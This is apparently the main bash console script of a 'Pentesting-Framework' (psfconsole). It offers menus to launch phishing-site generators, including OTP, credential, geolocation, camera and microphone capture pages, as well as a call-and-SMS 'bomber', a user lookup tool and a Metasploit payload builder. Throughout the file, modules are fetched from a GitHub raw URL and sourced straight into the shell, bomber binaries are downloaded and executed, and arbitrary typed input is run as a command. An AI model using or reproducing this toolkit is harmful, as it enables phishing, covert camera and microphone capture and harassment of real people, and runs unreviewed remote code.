#!/usr/bin/env bash

#┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
#┃ Project : Pentesting-Framework                              ┃
#┃ Author  : ABHacker Official                                 ┃
#┃ Version : 7.5.2 (Latest)                                    ┃
#┃ Github  : abhackerofficial <github.com/abhackerofficial>    ┃
#┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

set +x

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}

# Prompt

PROMPT=1

# Variable

export RAWLINK=https://raw.githubusercontent.com/abhackerofficial/pentesting-framework/master
export GITLINK=https://github.com/abhackerofficial/pentesting-framework
export OS=$(uname -o | grep -o "Android")
export OUTPUT=$HOME/.history.psf
CWD=$(pwd)
SUBMODULE=08
MODULE=04
VAR=7.5.2
PSNUM=3
NUM=1

# modules options list

if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/list.modules
else
source <(curl -sLo- "${RAWLINK}/assets/programs/list.modules")
fi

# sub modules name

declare -a SUBMODULES=(
notpweb
otpweb
gpsweb
callnsms
user
payload
)

# modules name

declare -a MODULES=(
phish
bomber
lookup
remote
)

# Colors

C0="$(printf '\033[90m')"  B0="$(printf '\033[100m')"
C1="$(printf '\033[91m')"  B1="$(printf '\033[101m')"
C2="$(printf '\033[92m')"  B2="$(printf '\033[102m')"
C3="$(printf '\033[93m')"  B3="$(printf '\033[103m')"
C4="$(printf '\033[94m')"  B4="$(printf '\033[104m')"
C5="$(printf '\033[95m')"  B5="$(printf '\033[105m')"
C6="$(printf '\033[96m')"  B6="$(printf '\033[106m')"
C7="$(printf '\033[97m')"  B7="$(printf '\033[107m')"
R0="$(printf '\033[00m')"
R1="$(printf '\033[01m')"
R2="$(printf '\033[02m')"
R3="$(printf '\033[03m')"
R4="$(printf '\033[04m')"
R5="$(printf '\033[05m')"
R6="$(printf '\033[06m')"
R7="$(printf '\033[07m')"

# Sign

r0SIGN="${C1}(${R0}>${C1})${R0}"
r1SIGN="${C1}(${R0}!${C1})${R0}"

g0SIGN="${C2}(${R0}>${C2})${R0}"
g1SIGN="${C2}(${R0}!${C2})${R0}"

b0SIGN="${C4}(${R0}>${C4})${R0}"
b1SIGN="${C4}(${R0}!${C4})${R0}"

# System Checker

function screenSize() {
    if ! hash tput &> /dev/null
    then
    apt install -y ncurses-utils
    fi

      SIZE=$(tput cols)

                if [ ! ${SIZE} -gt "60" ]
                then
                printf "\nYour Terminal Window Size must be above ${C2}60${R0} >= ${C1}${SIZE}${R0}\nPinch two fingers together on the screen to zoom out.\n"
                fi
}

if [[ $OS == *'Android'* ]];then
screenSize
TMPDIR=/data/data/com.termux/files/usr/tmp
pm() {
apt install -y $1
}
else
TMPDIR=/tmp
# Package Managers
    distro=$(source /etc/os-release && echo $ID)
    case $distro in
        arch)
            pm() {
		sudo pacman -Sy --noconfirm $1
		}
            ;;
        ubuntu)
            pm() {
		sudo apt-get install -y $1
		}
            ;;
        linuxmint)
            pm() { sudo apt-get install -y $1
		}
            ;;
        kali)
            pm() { sudo apt-get install -y $1
		}
            ;;
        parrot)
            pm() { sudo apt-get install -y $1
		}
            ;;
        debian)
            pm() { sudo apt-get install -y $1
		}
            ;;
        void)
            pm() { sudo xbps-install $1
		}
            ;;
        manjaro)
            pm() { sudo pacman -Sy $1
		}
            ;;
        garuda)
            pm() { sudo pacman -Sy $1
		}
            ;;
        alpine)
            pm() { sudo apk add $1
		}
            ;;
        gentoo)
            pm() { sudo emerge --ask $1
		}
            ;;
        fedora)
            pm() { sudo dnf install -y $1
		}
            ;;
        predator)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        artix)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        puppy_fossapup64)
            pm() { sudo pkg -d $1 && sudo pkg -i $1
		}
            ;;
        raspbian)
            pm() { sudo apt install -y $1
		}
            ;;
        endeavouros)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        freebsd)
            pm() { sudo pkg install -y $1
		}
            ;;
        *)
          echo "Sorry, but your System doesn't support [package manager] !"
          # Add manualy to use package manager to start psfconsole !
            exit 0
            ;;
    esac
fi

if ! hash svn &> /dev/null
then
pm subversion
fi

installPACKAGE() {
if ! hash $1 &> /dev/null
then
pm $1
fi
}

installPACKAGE "php"
installPACKAGE "git"
installPACKAGE "jq"
installPACKAGE "curl"
installPACKAGE "python"

if ! hash svn php git jq curl python &> /dev/null
then
printf "${C1}\e[1mE:${R0} Unable to run psfconsole right now Cause :\n"
printf "${C1}\e[1mE:${R0} Dependencies are not Installed yet (psfconsole)\n"
exit 1
fi

sudoPERM() {
if [[ $OS == *'Android'* ]];then
:
else
sudo -v
fi
}

setOS() {
if [[ $OS == *'Android'* ]];then
printf "$1"
# "$1"
else
printf "$2"
# "$2"
fi
}

killZONE() {
if [[ ! $__return__ == 105 ]];then
bash $CWD/assets/programs/progress.kill
else
bash <(curl -sL "${RAWLINK}/assets/programs/progress.kill")
fi
}

cacheFILES() {
if [[ ${MODE} == "withPHISH/OTPWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${OSITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withPHISH/NOTPWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withPHISH/GPSWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${GSITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withPHISH/CAMWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${CSITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withPHISH/MICWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${MSITES[${input} -1]}" &> /dev/null
fi
}

interruptPSF() {
printf "                                                  \r"
echo -e "${r0SIGN} Psfconsole is Interrupted                "
exit 0
}

interrupt () {
exit_on_signal_SIGINT () { killZONE
if [[ ! $__return__ == 105 ]];then
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
interruptPSF
else
interruptPSF
fi
}

exit_on_signal_SIGTSTP () { killZONE
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
interruptPSF
else
interruptPSF
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}

# <<<--- Help Mode --->>>

helpCOMMANDS () {
echo -e "
${B0}Available Commands${R0}
================

    Command     Description
    -------     -----------
    ${C2}use${R0}         Command to call existing module${R1}s${R0}.
    ${C2}list${R0}        Command to show available option${R1}s${R0}.
    ${C2}exit${R0}        Command to exit Pentesting Framework instance.
    ${C2}search${R0}      Command to search Available module.
    ${C2}clear${R0}       Command to clear screen.
    ${C2}banner${R0}      Command to shows a random banner.

${B0}psfconsole${R0}
==========

\`${C4}psfconsole${R0}\` is a bundle of penetration testing tools and an interface to Pentesting Framework.
This framework is currently undergoing heavy development. So, please be patient and keep an eye on this space!
"
}


moduleCOMMANDS() {
echo -e "
${B0}Modules${R0}
========

${C3}'phish' 'bomber' 'lookup' 'remote'${R0}

Usage: ${C3}use with:<module>/<submodule>/handler${R0}

    Available Sub Modules             Description
    -----------------------           -----------
    ${C2}use with:phish/otpweb/handler${R0}     module to run with:notp phishing site${R1}s${R0}.
    ${C2}use with:phish/notpweb/handler${R0}    module to run with:otp phishing site${R1}s${R0}.
    ${C2}use with:phish/gpsweb/handler${R0}     module to create geolocation phishing site${R1}s${R0}.
    ${C2}use with:phish/camweb/handler${R0}     module to create camera phishing site${R1}s${R0}.
    ${C2}use with:phish/micweb/handler${R0}     module to create microphone phishing site${R1}s${R0}.
    ${C2}use with:bomber/callnsms/handler${R0}  module to perform a bombing attack.
    ${C2}use with:lookup/user/handler${R0}      module to gather information of user${R1}s${R0}.
    ${C2}use with:remote/payload/handler${R0}   module to create a metasploit payload
                                      for your target device${R1}s${R0}.

    Upcomming Modules          Description
    -----------------------    -----------
    ${C6}use with:brute/handler${R0}     module to perform a bruteforce attack.
    ${C6}use with:secure/handler${R0}    module to secure your personal stuff.
"
}

infoCOMMANDS() {
logPRINT() {
printf "\rConnection to GitHub ..."
}

UPDATE() {
UPDATE=$(cat <(curl -sLo- git.io/pSf) | grep "VAR" | awk '{print $1}' | head -n1 | cut -c 5-)
printf "\r                          "
}

logPRINT & UPDATE

if [[ $VAR != $UPDATE ]]
then
STATUS=$(echo "Available          Update using :- psf update")
else
STATUS=$(echo "Unavailable        Check available update")
fi

echo -e "
Available Info:
===============

   Option         Current Setting    Description
   -------        ---------------    -----------
   PsfUpdate      $STATUS
"
}

pluginCOMMANDS() {
echo -e "${g0SIGN} Available Framework plugins:
    * api key
    * history
    * json
    * ls.gd
    * ngrok
    * prompt
    * request
    * token
"
}


optionCOMMANDS() {
echo -e "
Global Options:
===============

   Option             Current Setting      Description
   ------             ---------------      -----------
   ConsoleLogging     false                Log all console input and output
   HistoryLog         $LOG                   Verbosity of logs
   Prompt             psf prompt=$PROMPT         The prompt string
   PromptChar         $STYLE               The prompt character
"
}

# <<<--- Installer --->>>

if [[ ${1} == "-i" || ${1} == "--install" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/setup.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/setup.psfconsole")
fi
exit 0

elif [[ ${1} == "-u" || ${1} == "--update" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/update.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/update.psfconsole")
fi
exit 0

elif [[ ${1} == "-r" || ${1} == "--remove" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/remove.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/remove.psfconsole")
fi
exit 0
fi


if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/credentials.site
else
source <(curl -sLo- "${RAWLINK}/assets/programs/credentials.site")
fi


# <<<--- Argument Menu ! --->>>

if [[ ${1} == "-h" || ${1} == "--help" ]]
then
echo "Psfconsole release v${VAR}"
exit 0
fi

if [[ ${1} == "PROMPT"* ]]
then
 INT=$(printf "${1#PROMPT=}")
  INT=${INT#0}
  if [[ ${INT} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
   if [[ ! ${INT} -gt ${PSNUM} ]]
    then
       if [[ ! $__return__ == 105 ]]
        then
        FIND=$(grep -w "PROMPT=*" $(basename $0) | awk NR==1)
        sed -i "s/$FIND/PROMPT=$INT/g" $(basename $0)
        PROMPT=$INT
        else
        PROMPT=$INT
       fi
    else
    echo "${r0SIGN} Your Prompt Number digit must be above ${C1}${INT}${R0} <= ${C2}${PSNUM}${R0}"
   fi
 fi
fi


if [[ ${2} == "1" || ${2} == "01" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withPHISH/OTPWEB/otpweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withPHISH/OTPWEB/otpweb") ${1} ${2} ${3} ${4}
fi

elif [[ ${2} == "2" || ${2} == "02" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withPHISH/NOTPWEB/notpweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withPHISH/NOTPWEB/notpweb") ${1} ${2} ${3} ${4}
fi

elif [[ ${2} == "3" || ${2} == "03" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withPHISH/GPSWEB/gpsweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withPHISH/GPSWEB/gpsweb") ${1} ${2} ${3} ${4}
  fi
fi


readINPUT() {
if [[ ${input} == "list" ]]
 then
    $1

elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
    if [[ ${input} -lt $2 ]]
    then
    if [[ ! $__return__ == 105 ]];then
    source $CWD/programs/$3
    else
    cd $TMPDIR || exit 1
    printf "${b0SIGN} Downloading Program...   \r"
    source <(curl -sLo- "${RAWLINK}/programs/$3")
fi
fi
fi
     theERROR
     extarnalCMD
}


randomBANNER() {
RANDOMs=$(echo $((1 + $RANDOM % 12)))
if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo."${RANDOMs}"
else
bash <(curl -sL "${RAWLINK}/assets/logos/logo.${RANDOMs}")
fi
}

randomTIP() {
RANDOMs=$(echo $((1 + $RANDOM % 2)))

case ${RANDOMs} in
1)
       printf "Psfconsole tip: When in a module, use ${C2}back${R0} to go\n";WAIT
       printf "back to the top level prompt\n\n";WAIT
       ;;
2)
       printf "Psfconsole tip: You can use ${C2}help${R0} to view all\n";WAIT
       printf "available commands and modules.\n\n";WAIT
       ;;
esac
}

theHEADER() {
randomBANNER
printf "+ -- --=[ ${C3}psfconsole release v${VAR}${R0} ]=-- -- +\n";WAIT
printf "+ -- --=[ ${C2}${MODULE} module - submodule ${SUBMODULE}${R0}  ]=-- -- +\n\n";WAIT
randomTIP
}

theHEADER


function psfHISTORY () {
NUM=1

if [[ ! -f $OUTPUT ]]
 then
 touch $OUTPUT
fi

LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')

overHISTORY() {
TOT=$((LOG-30))
sed -n "${TOT},${LOG}p" $OUTPUT > .temp.history.psf && mv .temp.history.psf $OUTPUT
}

if [[ ${LOG} -gt 50 ]]
then
cd $HOME || exit 1
overHISTORY
LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')
fi


i=1

fetch() {
while [ $i -le "${LOG}" ]
do
printf "...\n"
((i++))
done
}

FETCH=$(printf "$(fetch)")

declare -a LOGS=(
$(printf "${FETCH}")
)

historyLOOP() {
for i in "${LOGS[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  FILE=$(cat "$OUTPUT" | awk NR==${LOOP})
  history -s "${FILE}"
  ((NUM++))
  done
}
  historyLOOP
  LOOP=0
}

psf() {
psfHISTORY

if [[ $PROMPT == 1 ]]
then
read -r -e -p $'\e[4;0;0;0;0;0;0;0;0;4mpsf\e[0m > \e[0m' command
STYLE=$'\e[4mpsf\e[0m > \e[0m'

elif [[ $PROMPT == 2 ]]
then
read -r -e -p $'\e[0;104m \e[90m~/psf \e[0m\e[94m \e[0m' command
STYLE=$'\e[104m \e[90mpsf \e[0m\e[94m\e[0m'

elif [[ $PROMPT == 3 ]]
then
read -r -e -p $'\e[93;0;0;0;0;0;93mpsf\e[93m ➤ \e[0m' command
STYLE=$'\e[93mpsf\e[93m ➤ \e[0m'
fi

if [ ${#command} -gt 0 ]
then
if [[ $(cat "${OUTPUT}") == *"${command}"* ]]
then
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
echo "${command}" >> "$OUTPUT"
else
echo "${command}" >> "$OUTPUT"
fi
fi
}

showERROR() {
echo -e "${r0SIGN} Unsatisfied command ‘${@:1}’ :: execute '?'/'help'"
}

showHISTORY() {
while IFS= read -r line; do
    LOOP=$((${LOOP:-0}+1))
    printf "${LOOP}  $line\n"
done < "$OUTPUT"
LOOP=0
}


ignoreCOMMAND() {
if [[ ${command-} == "set"* ]]
then
showERROR $command
command=""
fi

if [[ ${input-} == "set"* ]]
then
showERROR $input
input=""
fi
}


ignoreERROR() {
if [[ ${input} == "?" || ${input} == "help" ]]
then
   :

elif [[ ${input} == "list" ]]
then
   :

elif [[ ${input} == "back" ]]
then
   :

elif [[ ${input} == "banner" ]]
then
   :

elif [[ ${input} == "exit" ]]
then
   :

elif [[ ${input} == "q" ]]
then
   :

elif [[ ${input} == "clear" ]]
then
   :

elif [[ ${input} == *""* ]]
     then
  if [[ ${#input} -gt 0 ]]
   then
      $input &> /dev/null
  if [[ $? == 0 ]]
     then
        :
      else
         showERROR "$input"
         input=""
  fi
fi

else
  showERROR "$input"
  input=""
  fi
}

theERROR() {
command="$command"
  if [ ${#command} -gt 0 ]
   then
      showERROR $command
  fi

input="$input"

if [[ ${MODE} == "withBOMBER/CALLNSMS" ]]
then
  if [[ ${#input} -gt 0 ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withLOOKUP/USRR" ]]
then
  if [[ ! ${input} -lt "3" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withREMOTE/PAYLOAD" ]]
then
  if [[ ! ${input} -lt "9"  ]]
     then
      ignoreERROR
  fi
fi

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
 then
if [[ ${MODE} == "withPHISH/OTPWEB" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withPHISH/NOTPWEB" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withPHISH/GPSWEB" ]]
then
  if [[ ! ${input} -lt "5" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withPHISH/CAMWEB" ]]
then
  if [[ ! ${input} -lt "5" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withPHISH/MICWEB" ]]
then
  if [[ ! ${input} -lt "2" ]]
     then
      ignoreERROR
  fi
fi

else
   if [[ ${#input} -gt 0 ]]
   then
      ignoreERROR
   fi
fi
}

getCOMMANDS() {
  if [[ ${command} == "use with:phish/otpweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:phish/notpweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:phish/gpsweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:phish/camweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:phish/micweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:lookup/user/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:lookup/ip/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:bomber/callnsms/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:remote/payload/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "?" || ${command} == "help" ]]
   then
      helpCOMMANDS
      command=""

  elif [[ ${command} == "banner" ]]
     then
        theHEADER
        command=""

  elif [[ ${command} == "list" ]]
     then
        echo -e "${g0SIGN} 'list' command only works with Modules! :: execute '?'/'help'"
        command=""

  elif [[ ${command} == "exit" || ${command} == "quit" ]]
     then
        echo -e "${g0SIGN} Existing Psfconsole ..."
        exit 0
        command=""

  elif [[ ${command} == "psf update" ]]
     then
       git pull
       command=""

  elif [[ ${command} == "use" ]]
     then
        echo -e "Usage: use with:<module>/handler

Interact with a module by name term/index.
If a module name is not found, it will be treated as a search term.
An index from the exist module results can be selected if desired.

Examples:
  use with:info/handler
"
        command=""

  elif [[ ${command} == "search" ]]
     then
        echo -e "Usage: search module:<module>
       search submodule:<submodule>

Search with a module/submodule by name term/index.
If a module name is not found, it will be treated as a search term.
An index from the search results from exist module selected if desired.

Examples:
  search module:lookup
  search submodule:user
"
        command=""

  elif [[ ${command} == "search module:"* ]]
     then
        INPUT="${command#search module:}"
for i in "${MODULES[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  CATCH=${i::$((${#i}))}
  if [[ ${CATCH} == ${INPUT} ]]
  then
     echo -e "Module \e[105m${INPUT}${R0} is Available."
     break
  fi
  ((NUM++))
  done

if [[ ${CATCH} != ${INPUT} ]]
  then
    echo -e "Module \e[101m${INPUT}${R0} is not Available."
fi
        LOOP=0
        command=""


  elif [[ ${command} == "search submodule:"* ]]
     then
        INPUT="${command#search submodule:}"
for i in "${SUBMODULES[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  CATCH=${i::$((${#i}))}
  if [[ ${CATCH} == ${INPUT} ]]
  then
     echo -e "Sub Module \e[105m${INPUT}${R0} is Available."
     break
  fi
  ((NUM++))
  done

if [[ ${CATCH} != ${INPUT} ]]
  then
    echo -e "Sub Module \e[101m${INPUT}${R0} is not Available."
fi
        LOOP=0
        command=""

  elif [[ ${command} == "show" ]]
     then
        echo -e "${r0SIGN} Argument required\n"
        echo -e "${g0SIGN} Valid parameters for the \"show\"command are: modules, info, plugins, options"
        command=""

  elif [[ ${command} == "show"* ]]
     then
        INPUT="${command#show }"
  if [[ $INPUT == "modules" ]]
   then
      moduleCOMMANDS
      command=""

  elif [[ $INPUT == "info" ]]
   then
      infoCOMMANDS
      command=""

  elif [[ $INPUT == "plugins" ]]
   then
      pluginCOMMANDS
      command=""

  elif [[ $INPUT == "options" ]]
   then
      optionCOMMANDS
      command=""

  elif [[ $INPUT == "-h" || $INPUT == "--help" || $INPUT == "help" ]]
    then
       echo -e "${g0SIGN} Valid parameters for the \"show\" command are: modules, info, plugins, options"
       command=""

   else
     echo -e "${r0SIGN} Invalid parameter \"${INPUT}\", use "'"show -h"'" for more information. "
     command=""
  fi

  elif [[ ${command} == "q" ]]
     then
        clear
        exit 0
        command=""

  elif [[ ${command} == "clear" ]]
     then
        clear
        command=""

  elif [[ ${command} == "history" ]]
      then
         showHISTORY
         command=""

  elif [[ ${command} == *""* ]]
     then
        ignoreCOMMAND command
  if [[ ${#command} -gt 0 ]]
   then
      $command &> /dev/null
  if [[ $? == 0 ]]
     then
        echo -e "\e[94m(\e[0mexec\e[94m)\e[0m: ${command}"
        $command
        command=""
      else
         :
  fi
fi
  fi
}

extarnalCMD() {
  if [[ ${input} == "?" || ${input} == "help" ]]
   then
       helpCOMMANDS

   elif [[ ${input} == "back" ]]
      then
while true
do
         readCOMMAND
done
elif [[ ${input} == "banner" ]]
      then
         theHEADER

elif [[ ${input} == "exit" ]]
      then
         echo -e "${g0SIGN} Existing psfconsole..."
         exit 0

elif [[ ${input} == "q" ]]
      then
         clear
         exit 0

elif [[ ${input} == "clear" ]]
      then
         clear

elif [[ ${input} == *""* ]]
     then
        ignoreCOMMAND input
  if [[ ${#input} -gt 0 ]]
   then
      $input &> /dev/null
  if [[ $? == 0 ]]
     then
        echo -e "\e[94m(\e[0mexec\e[94m)\e[0m: ${input}"
        $input
        input=""
      else
         :
  fi
fi
  fi
}

readCONFIGURE () {
  if [[ ${command} == "use with:phish/otpweb/handler" ]]
  then
     MODE=withPHISH/OTPWEB
     echo -e "${b0SIGN} Using configured with:phish/otpweb mode"
#     list1
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mwebpage/phish/otpweb\e[0m) > ' input
     command=""
     readINPUT "list1-m1" "31" "withPHISH/OTPWEB/otpweb"
     done

  elif [[ ${command} == "use with:phish/notpweb/handler" ]]
  then
     MODE=withPHISH/NOTPWEB
     echo -e "${b0SIGN} Using configured with:phish/notpweb mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mwebpage/phish/notpweb\e[0m) > ' input
     command=""
     readINPUT "list2-m1" "31" "withPHISH/NOTPWEB/notpweb"
     done

elif [[ ${command} == "use with:phish/gpsweb/handler" ]]
  then
     MODE=withPHISH/GPSWEB
     echo -e "${b0SIGN} Using configured with:phish/gpsweb mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mwebpage/phish/gpsweb\e[0m) > ' input
     command=""
     readINPUT "list3-m1" "5" "withPHISH/GPSWEB/gpsweb"
     done

elif [[ ${command} == "use with:phish/camweb/handler" ]]
  then
     MODE=withPHISH/CAMWEB
     echo -e "${b0SIGN} Using configured with:phish/camweb mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mwebpage/phish/camweb\e[0m) > ' input
     command=""
     readINPUT "list4-m1" "5" "withPHISH/CAMWEB/camweb"
     done

elif [[ ${command} == "use with:phish/micweb/handler" ]]
  then
     MODE=withPHISH/MICWEB
     echo -e "${b0SIGN} Using configured with:phish/micweb mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mwebpage/phish/micweb\e[0m) > ' input
     command=""
     readINPUT "list5-m1" "2" "withPHISH/MICWEB/micweb"
     done

elif [[ ${command} == "use with:bomber/callnsms/handler" ]]
  then
     MODE=withBOMBER/CALLNSMS
     echo -e "${b0SIGN} Using configured with:bomber/callnsms mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mprogram/bomber/callnsms\e[0m) > ' input
     command=""
     if [[ $input == "list" ]]
     then
     echo -e "\n${b0SIGN} set bomber\n"
     elif [[ ${input} == "set bomber" ]]
     then
        input=""
case $(dpkg --print-architecture) in
    aarch64)
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/CALLNSMS/callnsms.aarch64
        else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/CALLNSMS/callnsms.aarch64 |
       printf "${b0SIGN} Downloading Program...   \r"
       chmod +x callnsms.aarch64
       ./callnsms.aarch64
       fi
        ;;
    arm*)
        findOS=$(setOS 'arm' 'arm64')
        findOS=$(printf ${findOS[@]})
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/CALLNSMS/callnsms.$findOS
        else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/CALLNSMS/callnsms.$findOS |
       printf "${b0SIGN} Downloading Program...   \r"
       chmod +x callnsms.$findOS
       ./callnsms.$findOS
       fi
        ;;
    amd*)
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/CALLNSMS/callnsms.amd64
        else
       cd $TMPDIR
       curl -sLO ${RAWLINK}/programs/withBOMBER/CALLNSMS/callnsms.amd64 |
       printf "${b0SIGN} Downloading Program...   \r"
       chmod +x callnsms.amd64
       ./callnsms.amd64
       fi
        ;;
esac

       fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:lookup/user/handler" ]]
  then
     MODE=withLOOKUP/USER
     echo -e "${b0SIGN} Using configured with:lookup/user mode"
     while true
     do
     read -r -p $'\e[4mpsf\e[0m use(\e[91mprogram/lookup/user\e[0m) > ' input
     command=""
     readINPUT "list1-m3" "3" "withLOOKUP/USER/user"
     done

elif [[ ${command} == "use with:remote/payload/handler" ]]
  then
     MODE=withREMOTE/PAYLOAD
     echo -e "${b0SIGN} Using configured with:remote/payload mode"
     while true
     do
     read -r -p $'\e[4psf\e[0m use(\e[91mprogram/remote/payload\e[0m) > ' input
     command=""
     readINPUT "list1-m4" "9" "withREMOTE/PAYLOAD/payload"
     done
  fi
}

readCOMMAND() {
interrupt
while true
do
psf
getCOMMANDS
if [[ ${TRUE} == "true" ]]
then
  break & readCONFIGURE
fi
input=""
theERROR
done
}

sudoPERM
readCOMMAND

# <<<--- End --->>>
